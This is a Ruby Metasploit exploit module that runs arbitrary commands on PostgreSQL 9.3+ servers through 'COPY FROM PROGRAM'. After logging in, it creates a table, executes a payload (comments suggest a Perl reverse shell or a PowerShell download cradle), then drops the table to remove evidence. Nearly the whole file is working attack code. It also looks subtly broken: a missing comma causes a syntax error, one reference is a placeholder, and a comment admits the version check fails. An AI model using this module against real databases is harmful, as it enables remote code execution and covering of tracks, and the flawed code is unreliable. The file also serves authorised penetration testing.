##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/postgres'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Postgres
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'PostgreSQL >9.3 Command Execution',
      'Description' => %q(
        Installations running Postgres 9.3 and above have functionality which allows for the superuser 
        and users with 'pg_read_server_files' piping COPY to and from an external program. 
        This allows arbitary command execution as though you have console access.

        This module attempts to create a new table, then execute system commands in the context of 
        copying the command output into the table.

        This module should work on all Postgres systems running version 9.3 and above. 
      ),
      'Author' => [
        'Jacob Wilkin', # author of this module
        'Micheal Cottingham', # the postgres_createlang module that this is based on
      ],
      'License' => MSF_LICENSE,
      'References' => [
        ['URL', '<Blogpost on the subject>'],
        ['URL', 'https://www.postgresql.org/docs/9.3/release-9-3.html'] #Patch notes adding the function, see 'E.26.3.3. Queries - Add support for piping COPY and psql \copy data to/from an external program (Etsuro Fujita)'
      ],
        'PayloadType' => %w(cmd)
      'Platform' => %w(linux unix win osx),
      'Payload' => {
      },
      'Arch' => [ARCH_CMD],
      'Targets' => [
        ['Automatic', {}]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Feb 24 2019'
    ))

    register_options([
      Opt::RPORT(5432),
      OptString.new('TABLENAME', [ true, 'A table name that doesnt exist(To avoid deletion)', 'msftesttable']),
      OptString.new('COMMAND', [ false, 'Send a custom command instead of a payload, use with powershell web delivery against windows', ''])
    ])

    deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
  end

  # Return the datastore value of the same name
  # @return [String] tablename for table to use with command execution
  def tablename; datastore['TABLENAME']; end

  # Return the datastore value of the same name
  # @return [String] command to run a custom command on the target
  def command; datastore['COMMAND']; end

  def postgres_version(version)
    version_match = version.match(/(?<software>\w{10})\s(?<major_version>\d{1,2})\.(?<minor_version>\d{1,2})\.(?<revision>\d{1,2})/)
    print_status(version_match['major_version'])
    print_status(version_match['minor_version'])
    return version_match['major_version'],version_match['minor_version']
  end

  def postgres_minor_version(version)
    version_match = version.match(/(?<software>\w{10})\s(?<major_version>\d{1,2})\.(?<minor_version>\d{1,2})\.(?<revision>\d{1,2})/)
    version_match['minor_version']
  end

  def check
    if vuln_version?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def vuln_version?
    version = postgres_fingerprint
    if version[:auth]
      version_full = postgres_version(version[:auth])
      major_version = version_full[0]
      minor_version = version_full[1]
      print_status(major_version)
      print_status(minor_version)
      if major_version && major_version.to_i > 9 # If major above 9, return true
        return true 
      end
      if major_version && major_version.to_i == 9 # If major version equals 9, check for minor 3
        if minor_version && minor_version.to_i >= 3 # If major 9 and minor 3 or above return true
          return true 
        end
      end
    end
    false
  end

  def login_success?
    status = do_login(username, password, database)
    case status
    when :noauth
      print_error "#{peer} - Authentication failed"
      return false
    when :noconn
      print_error "#{peer} - Connection failed"
      return false
    else
      print_status "#{peer} - #{status}"
      return true
    end
  end

  def execute_payload()   
    # Drop table if it exists
    query = "DROP TABLE IF EXISTS #{tablename};"
    drop_query = postgres_query(query)
    case drop_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} dropped successfully"
    else
      print_error "#{peer} - Unknown"
      return false
    end

    # Create Table 
    query = "CREATE TABLE #{tablename}(filename text);"
    create_query = postgres_query(query)
    case create_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} created successfully"
    else
      print_error "#{peer} - Unknown"
      return false
    end

    # Copy Command into Table
    if command != '' # Use command if its not empty, example powershell web_delivery download cradle. Needed for windows because NETWORK SERVICE doesnt have write to disk privs, need to execute in memory
      cmd_filtered = command.gsub("'", "''")
    else #Otherwise use the set payload, linux suggested is to use cmd/unix/reverse_perl
      cmd_filtered = payload.encoded.gsub("'", "''")
    end
    query = "COPY #{tablename} FROM PROGRAM '#{cmd_filtered}';"
    copy_query = postgres_query(query)
    case copy_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} copied successfully(valid syntax/command)"
    else
      print_error "#{peer} - Unknown"
      return false
    end

    # Select output from table for debugging
    #query = "SELECT * FROM #{tablename};"
    #select_query = postgres_query(query)
    #case select_query.keys[0]
    #when :conn_error
    #  print_error "#{peer} - Connection error"
    #  return false
    #when :sql_error
    #  print_warning "#{peer} - Unable to execute query: #{query}"
    #  return false
    #when :complete
    #  print_good "#{peer} - #{tablename} contents:\n#{select_query}"
    #  return true
    #else
    #  print_error "#{peer} - Unknown"
    #  return false
    #end

    # Clean up table evidence
    query = "DROP TABLE IF EXISTS #{tablename};"
    drop_query = postgres_query(query)
    case drop_query.keys[0]
    when :conn_error
      print_error "#{peer} - Connection error"
      return false
    when :sql_error
      print_warning "#{peer} - Unable to execute query: #{query}"
      return false
    when :complete
      print_good "#{peer} - #{tablename} dropped successfully(Cleaned)"
    else
      print_error "#{peer} - Unknown"
      return false
    end
  end

  def do_login(user, pass, database)
    begin
      password = pass || postgres_password
      result = postgres_fingerprint(
        db: database,
        username: user,
        password: password
      )

      return result[:auth] if result[:auth]
      print_error "#{peer} - Login failed"
      return :noauth

    rescue Rex::ConnectionError
      return :noconn
    end
  end

  def exploit
    print_status("Exploiting...")
    #vuln_version doesn't seem to work
    #return unless vuln_version?
    return unless login_success?
    successful_exploit = execute_payload
    if successful_exploit == false
      print_status("Exploit Failed")
    else
      print_status("Exploit Succeeded")
    end
    postgres_logout if @postgres_conn
  end
end